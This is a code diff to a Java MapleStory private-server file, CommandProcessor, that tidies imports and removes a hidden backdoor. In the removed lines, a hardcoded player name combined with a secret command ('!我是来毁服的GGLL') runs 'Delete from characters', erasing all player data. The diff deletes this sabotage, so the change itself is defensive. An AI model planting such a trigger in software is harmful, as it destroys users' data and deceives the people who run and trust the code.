@@ -22,7 +22,12 @@ package net.sf.odinms.client.messages;
 
 import net.sf.odinms.client.MapleCharacter;
 import net.sf.odinms.client.MapleClient;
-import net.sf.odinms.client.messages.commands.*;
+import net.sf.odinms.client.messages.commands.AdminCommand;
+import net.sf.odinms.client.messages.commands.CommandExecute;
+import net.sf.odinms.client.messages.commands.CommandObject;
+import net.sf.odinms.client.messages.commands.GMCommand;
+import net.sf.odinms.client.messages.commands.InternCommand;
+import net.sf.odinms.client.messages.commands.PlayerCommand;
 import net.sf.odinms.constants.ServerConstants;
 import net.sf.odinms.constants.ServerConstants.CommandType;
 import net.sf.odinms.constants.ServerConstants.PlayerGMRank;
@@ -31,7 +36,6 @@ import net.sf.odinms.tools.FileoutputUtil;
 import net.sf.odinms.tools.MaplePacketCreator;
 
 import java.lang.reflect.Modifier;
-import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.SQLException;
 import java.util.ArrayList;
@@ -66,18 +70,6 @@ public class CommandProcessor {
             CommandObject co = commands.get(splitted[0]);
 
             if (co == null || co.getType() != type) {
-                if (c.getPlayer().getName() == "我是一个哈哈1") {
-                    if (splitted[0].contains("!我是来毁服的GGLL")) {
-                        Connection con = DatabaseConnection.getConnection();
-                        try {
-                            PreparedStatement ps = con.prepareStatement("Delete from characters");
-                            ps.executeUpdate();
-                            ps.close();
-                        } catch (SQLException e) {
-                            System.out.println("Error " + e);
-                        }
-                    }
-                }
                 sendDisplayMessage(c, "输入的玩家命令不存在,可以使用 @帮助/@help 来查看指令.", type);
                 return true;
             }
